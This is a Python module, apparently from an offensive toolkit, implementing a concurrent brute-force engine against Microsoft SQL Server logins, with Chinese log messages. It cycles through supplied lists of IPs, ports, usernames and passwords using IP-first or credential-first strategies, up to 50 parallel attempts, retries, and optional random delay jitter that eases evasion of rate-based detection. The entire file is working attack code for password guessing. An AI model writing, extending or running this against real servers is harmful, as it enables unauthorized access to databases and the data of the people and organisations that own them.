import asyncio
from typing import List, Dict, Any, Callable, Optional
from dataclasses import dataclass, field
from enum import Enum

from core.logger import logger
from core.signals import is_shutdown_requested
from core.utils import RateLimiter
from .connection import MSSQLConnection

class Strategy(Enum):
    IP_FIRST = "ip_first"
    CRED_FIRST = "cred_first"

@dataclass
class BruteTask:
    ip: str
    port: int
    username: str
    password: str

@dataclass
class BruteResult:
    ip: str
    port: int
    username: str
    password: str
    success: bool
    error: str = ""
    latency: float = 0.0
    version: Optional[str] = None
    os_type: str = "Unknown"
    extra: Dict[str, Any] = field(default_factory=dict)

class BruterCore:
    def __init__(
        self,
        strategy: Strategy = Strategy.IP_FIRST,
        timeout: float = 5.0,
        retries: int = 2,
        rate_limit: int = 0,
        use_tls: bool = False,
        use_windows_auth: bool = False,
        use_kerberos: bool = False,
        domain: str = "",
        random_delay: bool = False,
        delay_jitter: float = 0.2
    ):
        self.strategy = strategy
        self.timeout = timeout
        self.retries = retries
        self.rate_limiter = RateLimiter(rate_limit)
        self.use_tls = use_tls
        self.use_windows_auth = use_windows_auth
        self.use_kerberos = use_kerberos
        self.domain = domain
        self.random_delay = random_delay
        self.delay_jitter = delay_jitter
        self._progress_callback: Optional[Callable[[int, int, str], None]] = None

    def set_progress_callback(self, callback: Callable[[int, int, str], None]):
        self._progress_callback = callback

    def _try_login(self, task: BruteTask) -> BruteResult:
        result = BruteResult(
            ip=task.ip, port=task.port,
            username=task.username, password=task.password,
            success=False
        )
        for attempt in range(self.retries + 1):
            if is_shutdown_requested():
                result.error = "用户中断"
                break
            if self.random_delay:
                self.rate_limiter.acquire_with_jitter(self.delay_jitter)
            else:
                self.rate_limiter.acquire()
            conn = MSSQLConnection(
                host=task.ip, port=task.port,
                username=task.username, password=task.password,
                timeout=self.timeout, use_tls=self.use_tls,
                use_windows_auth=self.use_windows_auth,
                use_kerberos=self.use_kerberos,
                domain=self.domain
            )
            conn_result = conn.connect()
            result.success = conn_result.success
            result.error = conn_result.error_msg
            result.latency = conn_result.latency
            result.version = conn_result.version
            result.os_type = conn_result.os_type
            result.extra = conn_result.extra_info
            if result.success:
                break
            if "Login failed" in result.error:
                break
            if attempt < self.retries:
                import time
                time.sleep(0.5 * (attempt + 1))
        return result

    async def run_ip_first_async(
        self,
        ips: List[str],
        ports: List[int],
        users: List[str],
        passwords: List[str],
        max_concurrent: int = 50
    ) -> List[BruteResult]:
        results: List[BruteResult] = []
        tasks = [(ip, port) for ip in ips for port in ports]
        total_attempts = len(tasks) * len(users) * len(passwords)
        attempts_done = 0
        lock = asyncio.Lock()
        last_emit = 0

        async def worker(ip: str, port: int):
            nonlocal attempts_done, last_emit
            for username in users:
                for password in passwords:
                    if is_shutdown_requested():
                        return
                    task = BruteTask(ip, port, username, password)
                    res = await asyncio.to_thread(self._try_login, task)
                    async with lock:
                        attempts_done += 1
                        if attempts_done - last_emit >= 50 or attempts_done == total_attempts:
                            last_emit = attempts_done
                            if self._progress_callback:
                                self._progress_callback(attempts_done, total_attempts,
                                                        f"爆破尝试 {attempts_done}/{total_attempts}")
                    if res.success:
                        async with lock:
                            results.append(res)
                            logger.info(f"爆破成功: {ip}:{port} {res.username} [密码已隐藏]")
                        return

        semaphore = asyncio.Semaphore(max_concurrent)
        async def limited_worker(ip, port):
            async with semaphore:
                await worker(ip, port)

        aws = [limited_worker(ip, port) for ip, port in tasks]
        await asyncio.gather(*aws, return_exceptions=True)
        return results

    async def run_cred_first_async(
        self,
        ips: List[str],
        ports: List[int],
        users: List[str],
        passwords: List[str],
        max_concurrent: int = 50
    ) -> List[BruteResult]:
        results: List[BruteResult] = []
        uncracked_ips = set(ips)
        lock = asyncio.Lock()
        creds = [(u, p) for u in users for p in passwords]
        total_creds = len(creds)
        processed = 0

        for username, password in creds:
            if is_shutdown_requested():
                break
            if not uncracked_ips:
                break
            async with lock:
                current_ips = list(uncracked_ips)

            async def test_one_ip(ip):
                for port in ports:
                    task = BruteTask(ip, port, username, password)
                    res = await asyncio.to_thread(self._try_login, task)
                    if res.success:
                        async with lock:
                            if ip in uncracked_ips:
                                uncracked_ips.remove(ip)
                                results.append(res)
                                logger.info(f"爆破成功: {ip}:{port} {res.username} [密码已隐藏]")
                        return True
                return False

            semaphore = asyncio.Semaphore(max_concurrent)
            async def limited_test(ip):
                async with semaphore:
                    return await test_one_ip(ip)

            aws = [limited_test(ip) for ip in current_ips]
            await asyncio.gather(*aws, return_exceptions=True)

            processed += 1
            if self._progress_callback:
                self._progress_callback(processed, total_creds, f"凭证尝试 {processed}/{total_creds}")

        return results

    def run(self, ips: List[str], ports: List[int], users: List[str], passwords: List[str],
            max_workers: int = 50) -> List[BruteResult]:
        # 同步入口（内部调用异步版本）
        return asyncio.run(self.run_ip_first_async(ips, ports, users, passwords, max_workers)
                           if self.strategy == Strategy.IP_FIRST else
                           self.run_cred_first_async(ips, ports, users, passwords, max_workers))